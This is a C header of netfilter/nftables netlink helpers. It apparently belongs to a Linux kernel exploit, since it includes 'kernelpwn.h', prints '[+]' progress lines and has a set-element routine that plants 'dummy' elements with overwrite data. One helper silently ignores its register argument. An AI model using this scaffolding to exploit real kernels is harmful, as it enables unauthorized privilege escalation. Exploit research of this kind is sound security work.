#ifndef __NETLINK_H__
#define __NETLINK_H__
#ifndef _GNU_SOURCE
#define _GNU_SOURCE 
#endif

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <ctype.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/if_packet.h>

#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/netfilter/nfnetlink.h>

#include <libnftnl/common.h>
#include <libmnl/libmnl.h>
#include <libnftnl/table.h>
#include <libnftnl/chain.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>
#include <libnftnl/set.h>
#include <linux/netlink.h>
#include "kernelpwn.h"

#define TABLEMSG_SIZE NLMSG_SPACE(sizeof(struct nfgenmsg) + S8_NLA_SIZE)
#define U32_NLA_SIZE (sizeof(struct nlattr) + sizeof(uint32_t))
#define U64_NLA_SIZE (sizeof(struct nlattr) + sizeof(uint64_t))
#define S8_NLA_SIZE (sizeof(struct nlattr) + 8)
#define NLA_BIN_SIZE(x) (sizeof(struct nlattr) + x)
#define NLA_ATTR(attr) ((void *)attr + NLA_HDRLEN)


struct nlmsghdr *get_batch_begin_nlmsghdr() {
	struct nlmsghdr *nlh = (struct nlmsghdr*)malloc(NLMSG_SPACE(sizeof(struct nfgenmsg)));
	struct nfgenmsg *nfgm = (struct nfgenmsg*)NLMSG_DATA(nlh);
	if (!nlh) fail_exit("malloc");
	memset(nlh, 0, NLMSG_SPACE(sizeof(struct nfgenmsg)));
	nlh->nlmsg_len = NLMSG_SPACE(sizeof(struct nfgenmsg));
	nlh->nlmsg_type = NFNL_MSG_BATCH_BEGIN;
	nlh->nlmsg_pid = getpid();
	nlh->nlmsg_flags = 0;
	nlh->nlmsg_seq = 0;

	nfgm->res_id = NFNL_SUBSYS_NFTABLES;
	return nlh;
}

struct nlmsghdr *get_batch_end_nlmsghdr() {
	struct nlmsghdr *nlh = (struct nlmsghdr*)malloc(NLMSG_SPACE(sizeof(struct nfgenmsg)));
	if (!nlh) fail_exit("malloc");
	
	memset(nlh, 0, NLMSG_SPACE(sizeof(struct nfgenmsg)));
	nlh->nlmsg_len = NLMSG_SPACE(sizeof(struct nfgenmsg));
	nlh->nlmsg_type = NFNL_MSG_BATCH_END;
	nlh->nlmsg_pid = getpid();
	nlh->nlmsg_flags = NLM_F_REQUEST;;
	nlh->nlmsg_seq = 0;
	return nlh;
}

struct nlattr *set_nested_attr(struct nlattr *attr, uint16_t type, uint16_t data_len) {
	attr->nla_type = type;
	attr->nla_len = NLA_ALIGN(data_len+sizeof(struct nlattr));
	return (void*)attr + sizeof(struct nlattr);
}

struct nlattr *set_u32_attr(struct nlattr *attr, uint16_t type, uint32_t value) {
	attr->nla_type = type;
	attr->nla_len = U32_NLA_SIZE;
	*(uint32_t*)NLA_ATTR(attr) = htonl(value);
	return (void*)attr + U32_NLA_SIZE;
}

struct nlattr *set_u64_attr(struct nlattr *attr, uint16_t type, uint64_t value) {
	attr->nla_type = type;
	attr->nla_len = U64_NLA_SIZE;
	*(uint64_t*)NLA_ATTR(attr) = htobe64(value);
	return (void*)attr + U64_NLA_SIZE;
}

struct nlattr *set_str8_attr(struct nlattr *attr, uint16_t type, const char* name) {
	attr->nla_type = type;
	attr->nla_len = S8_NLA_SIZE;
	memcpy(NLA_ATTR(attr), name, 8);
	return (void*)attr + S8_NLA_SIZE;
}

struct nlattr *set_binary_attr(struct nlattr *attr, uint16_t type, uint8_t *buffer, uint64_t buffer_size) {
	attr->nla_type = type;
	attr->nla_len = NLA_BIN_SIZE(buffer_size);
	memcpy(NLA_ATTR(attr), buffer, buffer_size);
	return (void *)attr + NLA_ALIGN(NLA_BIN_SIZE(buffer_size));
}

struct nftnl_table *table_add_parse(const char *name)
{
	struct nftnl_table *t;
	uint16_t family = AF_INET;

	t = nftnl_table_alloc();
	if (t == NULL) fail_exit("nftnl_table_alloc()");
	 
	nftnl_table_set_u32(t, NFTNL_TABLE_FAMILY, family);
	nftnl_table_set_str(t, NFTNL_TABLE_NAME, name);
	return t;
}

struct nftnl_chain *chain_add_parse(const char *table_name, const char *chain_name, int hooknum)
{
	struct nftnl_chain *t;
//	int hooknum = 0;

	t = nftnl_chain_alloc();
	if (t == NULL) fail_exit("nftnl_chain_alloc()");
	nftnl_chain_set_str(t, NFTNL_CHAIN_TABLE, table_name);
	nftnl_chain_set_str(t, NFTNL_CHAIN_NAME, chain_name);
	nftnl_chain_set_u32(t, NFTNL_CHAIN_HOOKNUM, hooknum);
	nftnl_chain_set_u32(t, NFTNL_CHAIN_PRIO, 0);
	return t;
}

void create_table(const char *table_name) {
	struct mnl_socket *nl;
	char buf[MNL_SOCKET_BUFFER_SIZE];
	struct nlmsghdr *nlh;
	uint32_t portid, seq, table_seq, family;
	struct nftnl_table *t;
	struct mnl_nlmsg_batch *batch;
	int ret;

	t = table_add_parse(table_name);
	if (t == NULL) fail_exit("table_add_parse()");
	seq = time(NULL);
	batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

	nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	table_seq = seq;
	family = nftnl_table_get_u32(t, NFTNL_TABLE_FAMILY);
	nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
				    NFT_MSG_NEWTABLE, family,
				    NLM_F_CREATE | NLM_F_ACK, seq++);
	nftnl_table_nlmsg_build_payload(nlh, t);
	nftnl_table_free(t);
	mnl_nlmsg_batch_next(batch);

	nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	nl = mnl_socket_open(NETLINK_NETFILTER);
	if (nl == NULL) fail_exit("mnl_socket_open()");

	if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) fail_exit("mnl_socket_bind()");
	portid = mnl_socket_get_portid(nl);

	if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) < 0)
		fail_exit("mnl_socket_send()");

	mnl_nlmsg_batch_stop(batch);

	ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
	while (ret > 0) {
		ret = mnl_cb_run(buf, ret, table_seq, portid, NULL, NULL);
		if (ret <= 0)
			break;
		ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
	}
	if (ret == -1) fail_exit("create table");
	mnl_socket_close(nl);

}

void setup_table_and_chain(const char *table_name, const char *chain_name, int hooknum) {
	struct mnl_socket *nl;
	char table_buf[MNL_SOCKET_BUFFER_SIZE];
	char chain_buf[MNL_SOCKET_BUFFER_SIZE];
	struct nlmsghdr *nlh;
	uint32_t portid, t_seq, c_seq, table_seq, chain_seq, family;
	struct nftnl_table *t_table;
	struct nftnl_chain *t_chain;
	struct mnl_nlmsg_batch *batch_table, *batch_chain;
	int ret;

	// setup table
	t_table = table_add_parse(table_name);
	if (t_table == NULL) fail_exit("table_add_parse()");
	t_seq = time(NULL);
	batch_table = mnl_nlmsg_batch_start(table_buf, sizeof(table_buf));

	nftnl_batch_begin(mnl_nlmsg_batch_current(batch_table), t_seq++);
	mnl_nlmsg_batch_next(batch_table);

	table_seq = t_seq;
	family = nftnl_table_get_u32(t_table, NFTNL_TABLE_FAMILY);
	nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch_table),
				    NFT_MSG_NEWTABLE, family,
				    NLM_F_CREATE | NLM_F_ACK, t_seq++);
	nftnl_table_nlmsg_build_payload(nlh, t_table);
	nftnl_table_free(t_table);
	mnl_nlmsg_batch_next(batch_table);

	nftnl_batch_end(mnl_nlmsg_batch_current(batch_table), t_seq++);
	mnl_nlmsg_batch_next(batch_table);

	// setup chain
	t_chain = chain_add_parse(table_name, chain_name, hooknum);
	if (t_chain == NULL) fail_exit("chain_add_parse()");
	c_seq = time(NULL);
	batch_chain = mnl_nlmsg_batch_start(chain_buf, sizeof(chain_buf));

	nftnl_batch_begin(mnl_nlmsg_batch_current(batch_chain), c_seq++);
	mnl_nlmsg_batch_next(batch_chain);

	chain_seq = c_seq;
	family = NFPROTO_IPV4;
	nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch_chain),
				    NFT_MSG_NEWCHAIN, family,
				    NLM_F_CREATE | NLM_F_ACK, c_seq++);
	nftnl_chain_nlmsg_build_payload(nlh, t_chain);
	nftnl_chain_free(t_chain);
	mnl_nlmsg_batch_next(batch_chain);

	nftnl_batch_end(mnl_nlmsg_batch_current(batch_chain), c_seq++);
	mnl_nlmsg_batch_next(batch_chain);

	// setup netlink socket
	nl = mnl_socket_open(NETLINK_NETFILTER);
	if (nl == NULL) fail_exit("mnl_socket_open()");
	if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) fail_exit("mnl_socket_bind()");
	printf("[+] netlink socket is opened\n");
	portid = mnl_socket_get_portid(nl);

	// send table batch
	if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch_table), mnl_nlmsg_batch_size(batch_table)) < 0) 
		fail_exit("mnl_socket_sendto() for table");

	mnl_nlmsg_batch_stop(batch_table);

	ret = mnl_socket_recvfrom(nl, table_buf, sizeof(table_buf));
	while (ret > 0) {
		ret = mnl_cb_run(table_buf, ret, table_seq, portid, NULL, NULL);
		if (ret <= 0) break;
		ret = mnl_socket_recvfrom(nl, table_buf, sizeof(table_buf));
	}
	if (ret == -1) fail_exit("create table");
	printf("[+] Table %s created\n", table_name);

	// send chain batch
	if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch_chain), mnl_nlmsg_batch_size(batch_chain)) < 0)
		fail_exit("mnl_socket_send() for chain");

	mnl_nlmsg_batch_stop(batch_chain);

	ret = mnl_socket_recvfrom(nl, chain_buf, sizeof(chain_buf));
	while (ret > 0) {
		ret = mnl_cb_run(chain_buf, ret, chain_seq, portid, NULL, NULL);
		if (ret <= 0) break;
		ret = mnl_socket_recvfrom(nl, chain_buf, sizeof(chain_buf));
	}
	if (ret == -1) fail_exit("create chain");
	printf("[+] Chain %s created\n", chain_name);

	mnl_socket_close(nl);
}

struct nftnl_table *table_del_parse(const char *table_name) {
	struct nftnl_table *t;
	uint16_t family = AF_INET;

	t = nftnl_table_alloc();
	if (t == NULL) fail_exit("nftnl_table_attack()");
	nftnl_table_set_str(t, NFTNL_TABLE_NAME, table_name);
	nftnl_table_set_u32(t, NFTNL_TABLE_FAMILY, family);
	return t;
}

void dele_table(const char *table_name) {
	struct mnl_socket *nl;
	char buf[MNL_SOCKET_BUFFER_SIZE];
	struct nlmsghdr *nlh;
	uint32_t portid, seq, table_seq, family;
	struct nftnl_table *t;
	struct mnl_nlmsg_batch *batch;
	int ret;

	t = table_del_parse(table_name);
	if (t == NULL) fail_exit("table_del_parse()");
	seq = time(NULL);
	batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

	nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	table_seq = seq;
	family = nftnl_table_get_u32(t, NFTNL_TABLE_FAMILY);
	nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
				    NFT_MSG_DELTABLE, family,
				    NLM_F_ACK, seq++);
	nftnl_table_nlmsg_build_payload(nlh, t);
	mnl_nlmsg_batch_next(batch);
	nftnl_table_free(t);

	nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	nl = mnl_socket_open(NETLINK_NETFILTER);
	if (nl == NULL) fail_exit("mnl_socket_open()");
	if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0)
		fail_exit("mnl_socket_bind()");
	portid = mnl_socket_get_portid(nl);

	if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) < 0)
		fail_exit("mnl_socket_sendto()");
	mnl_nlmsg_batch_stop(batch);

	ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
	while (ret > 0) {
		ret = mnl_cb_run(buf, ret, table_seq, portid, NULL, NULL);
		if (ret <= 0) break;
		ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
	}
	if (ret == -1) fail_exit("mnl_socket_recvform()");
	mnl_socket_close(nl);
}

struct nftnl_set *setup_set(uint8_t family, const char *table, const char *name, uint32_t key_len, uint32_t data_len, uint32_t id)
{
	struct nftnl_set *s = NULL;

	s = nftnl_set_alloc();
	if (s == NULL) fail_exit("nftnl_set_alloc()");
	nftnl_set_set_str(s, NFTNL_SET_TABLE, table);
	nftnl_set_set_str(s, NFTNL_SET_NAME, name);
	nftnl_set_set_u32(s, NFTNL_SET_FAMILY, family);
	nftnl_set_set_u32(s, NFTNL_SET_KEY_LEN, key_len);
	nftnl_set_set_u32(s, NFTNL_SET_DATA_LEN, data_len);
	nftnl_set_set_u32(s, NFTNL_SET_DATA_TYPE, 0);
	nftnl_set_set_u32(s, NFTNL_SET_ID, id);
	nftnl_set_set_u32(s, NFTNL_SET_FLAGS, NFT_SET_MAP);

	return s;
}

void create_set(const char *table, const char *name, uint32_t key_len, uint32_t data_len, uint32_t id) {
	struct mnl_socket *nl;
	struct nftnl_set *s;
	struct nlmsghdr *nlh;
	struct mnl_nlmsg_batch *batch;
	uint8_t family = AF_INET;
	char buf[MNL_SOCKET_BUFFER_SIZE];
	uint32_t seq = time(NULL);
	int ret;

	s = setup_set(family, table, name, key_len, data_len, id);

	nl = mnl_socket_open(NETLINK_NETFILTER);
	if (nl == NULL) fail_exit("mnl_socket_open()");

	if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) fail_exit("mnl_socket_bind()");

	batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

	nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
				    NFT_MSG_NEWSET, family,
				    NLM_F_CREATE | NLM_F_ACK, seq++);

	nftnl_set_nlmsg_build_payload(nlh, s);
	nftnl_set_free(s);
	mnl_nlmsg_batch_next(batch);

	nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	ret = mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
				mnl_nlmsg_batch_size(batch));
	if (ret == -1) fail_exit("mnl_socket_sendto()");

	mnl_nlmsg_batch_stop(batch);

	ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
	if (ret == -1) fail_exit("mnl_socket_recvfrom()");

	ret = mnl_cb_run(buf, ret, 0, mnl_socket_get_portid(nl), NULL, NULL);
	if (ret < 0) fail_exit("mnl_cb_run()");

	mnl_socket_close(nl);
}

void set_elem(const char *table_name, const char *set_name, char *key, char *data, uint32_t data_len, char *overwrite_data) {
	struct mnl_socket *nl;
	char buf[MNL_SOCKET_BUFFER_SIZE];
	struct mnl_nlmsg_batch *batch;
	struct nlmsghdr *nlh;
	uint32_t portid, seq, family = AF_INET;
	struct nftnl_set *s;
	struct nftnl_set_elem *e;
	int ret;

	s = nftnl_set_alloc();
	if (s == NULL) fail_exit("nftnl_set_alloc()");
	seq = time(NULL);

	nftnl_set_set_str(s, NFTNL_SET_TABLE, table_name);
	nftnl_set_set_str(s, NFTNL_SET_NAME, set_name);

	/* Add to dummy elements to set */
	e = nftnl_set_elem_alloc();
	if (e == NULL) fail_exit("nftnl_set_elem_alloc()");
	nftnl_set_elem_set(e, NFTNL_SET_ELEM_KEY, key, 28);
	nftnl_set_elem_set(e, NFTNL_SET_ELEM_DATA, overwrite_data, data_len);
	nftnl_set_elem_add(s, e);

	key[0] += 1;
	e = nftnl_set_elem_alloc();
	if (e == NULL) fail_exit("nftnl_set_elem_alloc()");
	nftnl_set_elem_set(e, NFTNL_SET_ELEM_KEY, key, 28);
	nftnl_set_elem_set(e, NFTNL_SET_ELEM_VERDICT, data, 4);
	nftnl_set_elem_add(s, e);

	batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

	nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
				    NFT_MSG_NEWSETELEM, family,
				    NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK,
				    seq++);
	nftnl_set_elems_nlmsg_build_payload(nlh, s);
	nftnl_set_free(s);
	mnl_nlmsg_batch_next(batch);

	nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	nl = mnl_socket_open(NETLINK_NETFILTER);
	if (nl == NULL) fail_exit("mnl_socket_open()");

	if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) fail_exit("mnl_socket_bind()");
	portid = mnl_socket_get_portid(nl);

	if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) < 0) 
		fail_exit("mnl_socket_send()");

	mnl_nlmsg_batch_stop(batch);

	ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
	while (ret > 0) {
		ret = mnl_cb_run(buf, ret, 0, portid, NULL, NULL);
		if (ret <= 0)
			break;
		ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
	}
	if (ret == -1) fail_exit("set_elem");
	mnl_socket_close(nl);

}

void add_bitwise(struct nftnl_rule *r, uint32_t op_type, uint32_t expr_len,
		uint32_t expr_sreg, uint32_t expr_dreg, uint32_t data) {
	if(expr_len > 0xff) fail_exit("expr_len too big");
	struct nftnl_expr *ex = nftnl_expr_alloc("bitwise");
	nftnl_expr_set_u32(ex, NFTNL_EXPR_BITWISE_SREG, expr_sreg);
	nftnl_expr_set_u32(ex, NFTNL_EXPR_BITWISE_DREG, expr_dreg);
	nftnl_expr_set_u32(ex, NFTNL_EXPR_BITWISE_OP, op_type);
	nftnl_expr_set_u32(ex, NFTNL_EXPR_BITWISE_LEN, expr_len);
	nftnl_expr_set_u32(ex, NFTNL_EXPR_BITWISE_DATA, data);
	nftnl_rule_add_expr(r, ex);
}

void add_payload_set(struct nftnl_rule *r, uint32_t base, uint32_t offset, uint32_t len, uint32_t expr_sreg) {
	struct nftnl_expr *ex = nftnl_expr_alloc("payload");
	nftnl_expr_set_u32(ex, NFTNL_EXPR_PAYLOAD_SREG, expr_sreg);
	nftnl_expr_set_u32(ex, NFTNL_EXPR_PAYLOAD_BASE, base);
	nftnl_expr_set_u32(ex, NFTNL_EXPR_PAYLOAD_OFFSET, offset);
	nftnl_expr_set_u32(ex, NFTNL_EXPR_PAYLOAD_LEN, len);
	nftnl_expr_set_u32(ex, NFTA_PAYLOAD_CSUM_TYPE, NFT_PAYLOAD_CSUM_NONE);
	nftnl_rule_add_expr(r, ex);
}

void add_payload(struct nftnl_rule *r, uint32_t base, uint32_t offset, uint32_t len, uint32_t expr_dreg) {
	struct nftnl_expr *ex = nftnl_expr_alloc("payload");
	nftnl_expr_set_u32(ex, NFTNL_EXPR_PAYLOAD_DREG, expr_dreg);
	nftnl_expr_set_u32(ex, NFTNL_EXPR_PAYLOAD_BASE, base);
	nftnl_expr_set_u32(ex, NFTNL_EXPR_PAYLOAD_OFFSET, offset);
	nftnl_expr_set_u32(ex, NFTNL_EXPR_PAYLOAD_LEN, len);
	nftnl_rule_add_expr(r, ex);
}

void add_cmp(struct nftnl_rule *r, uint32_t op_type, uint32_t expr_sreg, void *data, uint32_t data_len) {
	struct nftnl_expr *ex = nftnl_expr_alloc("cmp");
	nftnl_expr_set(ex, NFTNL_EXPR_CMP_DATA, data, data_len);
	nftnl_expr_set_u32(ex, NFTNL_EXPR_CMP_SREG, expr_sreg);
	nftnl_expr_set_u32(ex, NFTNL_EXPR_CMP_OP, op_type);
	nftnl_rule_add_expr(r, ex);
}

void set_verdict(struct nftnl_rule *r, uint32_t verdict) {
	struct nftnl_expr *ex = nftnl_expr_alloc("immediate");
	nftnl_expr_set_u32(ex, NFTNL_EXPR_IMM_DREG, 0);
	nftnl_expr_set_u32(ex, NFTNL_EXPR_IMM_VERDICT, verdict);
	nftnl_rule_add_expr(r, ex);
}

void set_register_to_value(struct nftnl_rule *r, uint32_t dreg, void *data, uint32_t data_len) {
	struct nftnl_expr *ex = nftnl_expr_alloc("immediate");
	nftnl_expr_set_u32(ex, NFTNL_EXPR_IMM_DREG, 0);
	nftnl_expr_set_data(ex, NFTNL_EXPR_IMM_DATA, data, data_len);
	nftnl_rule_add_expr(r, ex);
}

#endif
